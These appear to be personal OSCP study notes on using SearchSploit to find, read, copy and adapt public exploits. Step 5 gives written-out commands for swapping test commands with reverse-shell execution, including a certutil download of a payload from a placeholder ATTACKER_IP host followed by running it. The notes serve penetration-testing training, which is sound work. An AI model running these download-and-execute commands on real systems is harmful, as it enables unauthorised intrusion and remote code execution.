# **🔎 SearchSploit — Exploit Research Workflow (OSCP)**

⚠️ **Important**

- SearchSploit does **NOT** exploit targets
    
- It helps you **find, read, and adapt public exploits**
    
- You must **understand and modify** exploits yourself
    

SearchSploit bridges:


> **Enumeration → Exploitation Research**

---

## **🧠 When to Use SearchSploit**

  

Use SearchSploit **only after enumeration** when you know at least one of:

- Software name (from Nmap, banners, files, configs)
    
- Version number (exact or approximate)
    

  

Examples:

- Apache 2.4.x
    
- Remote Mouse 3.008
    
- OpenSSH 7.2
    
- WordPress plugin + version
    

  

If you don’t know the software or version yet → **go back to enumeration**

---

## **STEP 1 — Basic Search**

searchsploit `<keyword>`
searchsploit `<software version>`

Examples:
searchsploit remote mouse
searchsploit apache 2.4
searchsploit wordpress plugin-name version

Goal:

- Find **relevant exploits**
    
- Ignore exploits that clearly don’t match your target OS/service
    

---

## **STEP 2 — View Exploit Code (Read First)**

Before copying anything, **read the exploit**.
`searchsploit -x <path>`

Example:
```
searchsploit -x windows/remote/46697.py
```
This opens the exploit in your pager so you can inspect it.

## **STEP 3 — What to Look for Inside Exploit Code**

###  **Target Requirements**
Ask:

- Does this require authentication?
    
- Does this require user interaction?
    
- Does this require a GUI?
    
- Is this Windows or Linux only?
    
- 32-bit or 64-bit?




### **Target IP Handling (How it connects)**

Look for:

- sys.argv
    
- argv
    
- HOST, TARGET, ip
    
- Hardcoded IPs or ports

Example patterns:
```python
target = sys.argv[1]
ip = argv[1]
```
`

### **Execution Capability (What it does)**
Search for:

- exec
    
- system
    
- os.system
    
- cmd
    
- subprocess
    
- socket
    
- connect
    
- send

This tells you:

- Whether it executes commands
    
- Whether it runs files
    
- Whether it sends keystrokes / mouse input
    
- Whether it opens a network socket to communicate with the target

### **Trigger Mechanism (How code runs)**

Ask:

> “What actually causes execution?”

Common triggers:

- Command execution
    
- File execution
    
- Service restart
    
- User interaction (mouse / keyboard)
    
- Script replacement
    
- Scheduled task

If you don’t understand the trigger → **don’t run the exploit yet**

## **STEP 4 — Copy Exploit Locally (When Ready)**

```bash
searchsploit -m <path>
```
Example:
```bash
searchsploit -m windows/remote/46697.py
```
📌 -m = _mirror_
Copies exploit into your current directory so you can edit it.

## **STEP 5 — Modify the Exploit (Most Important Step)**

Almost **every exploit** needs modification.

---
### **🔹 Replace Test Commands**

Many exploits use harmless test commands like:
`calc.exe`
or 
`id`
`whoami`

These **do nothing useful** as it just shows what the exploit would have ran before editing.

You must replace them with:

- Reverse shell execution
    
- Payload execution
    
- File download + execution

### **Typical Replacement Patterns**

#### **Replace with reverse shell execution**
```bash
cmd /c C:\Users\Public\winrev443.exe
```
#### **Replace with PowerShell execution**
```bash
powershell -c C:\Users\Public\winrev443.exe
```
#### **Replace with download + execute logic**
```bash
certutil.exe -urlcache -f http://ATTACKER_IP/payload.exe payload.exe
```
(⚠️ download ≠ execution)

Then execute separately:
```bash
cmd /c payload.exe
```
## **Related Notes**

- [[Msfvenom]]
- [[File_Transfer]]
- [[Netcat]]
- [[htaccess_Bypass]]
